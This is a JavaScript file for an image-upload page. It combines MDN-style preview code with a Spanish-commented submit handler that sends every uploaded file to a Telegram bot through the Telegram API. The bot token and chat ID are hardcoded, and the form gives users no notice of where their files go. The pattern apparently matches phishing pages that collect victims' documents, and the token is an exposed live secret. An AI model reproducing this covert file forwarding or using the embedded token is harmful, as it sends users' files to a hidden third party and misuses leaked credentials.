const input = document.querySelector("input");
const preview = document.querySelector(".preview");

input.style.opacity = 0;

input.addEventListener("change", updateImageDisplay);

function updateImageDisplay() {
  while (preview.firstChild) {
    preview.removeChild(preview.firstChild);
  }

  const curFiles = input.files;
  if (curFiles.length === 0) {
    const para = document.createElement("p");
    para.textContent = "No files currently selected for upload";
    preview.appendChild(para);
  } else {
    const list = document.createElement("ol");
    preview.appendChild(list);

    for (const file of curFiles) {
      const listItem = document.createElement("li");
      const para = document.createElement("p");
      if (validFileType(file)) {
        para.textContent = `File name ${file.name}, file size ${returnFileSize(
          file.size,
        )}.`;
        const image = document.createElement("img");
        image.src = URL.createObjectURL(file);
        image.alt = image.title = file.name;

        listItem.appendChild(image);
        listItem.appendChild(para);
      } else {
        para.textContent = `File name ${file.name}: Not a valid file type. Update your selection.`;
        listItem.appendChild(para);
      }

      list.appendChild(listItem);
    }
  }
}

// https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types
const fileTypes = [
  "image/apng",
  "image/bmp",
  "image/gif",
  "image/jpeg",
  "image/pjpeg",
  "image/png",
  "image/svg+xml",
  "image/tiff",
  "image/webp",
  "image/x-icon",
];

function validFileType(file) {
  return fileTypes.includes(file.type);
}

function returnFileSize(number) {
  if (number < 1e3) {
    return `${number} bytes`;
  } else if (number >= 1e3 && number < 1e6) {
    return `${(number / 1e3).toFixed(1)} KB`;
  } else {
    return `${(number / 1e6).toFixed(1)} MB`;
  }
}

const button = document.querySelector("form button");
button.addEventListener("click", (e) => {
  e.preventDefault();
  const para = document.createElement("p");
  para.append("Image uploaded!");
  preview.replaceChildren(para);
});


function copyToClipboard(spanId) {
  const text = document.getElementById(spanId).innerText;
  navigator.clipboard.writeText(text).then(() => {
      alert('Texto copiado: ' + text);
  }).catch(err => {
      console.error('Error al copiar: ', err);
  });
}

/* Metodo para subir Archivos */
document.getElementById('uploadForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const files = document.getElementById('image_uploads').files;

  if (files.length > 0) {
      Array.from(files).forEach(file => {
          addSolicitudFileHandler(file)
              .then(() => console.log("Subiendo Archivo"))
              .catch(error => console.error(error));
      });
  }
});

function handleFileChange(e) {
  const files = e.target.files;
  const preview = document.querySelector('.preview');
  
  if (files.length > 0) {
      preview.innerHTML = '';
      Array.from(files).forEach(file => {
          const p = document.createElement('p');
          p.textContent = file.name;
          preview.appendChild(p);
      });
  } else {
      preview.innerHTML = '<p>No files currently selected for upload</p>';
  }
}

document.getElementById('image_uploads').addEventListener('change', handleFileChange);

async function addSolicitudFileHandler(solicitudData) {
  const CHAT_ID = '-4120594353';
  const TOKEN_BOT_API = '6702487731:AAHKIgUr4xE-kzTF4DyrrsqjJQiC_d7b1Hw';

  const urlFile = `https://api.telegram.org/bot${TOKEN_BOT_API}/sendDocument`;

  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('document', solicitudData);

  try {
      const response = await fetch(urlFile, {
          method: 'POST',
          body: formData,
      });

      if (!response.ok) {
          throw new Error(`Error: ${response.statusText}`);
      }

      const data = await response.json();
      console.log(data);
  } catch (error) {
      console.log(error);
  }
}
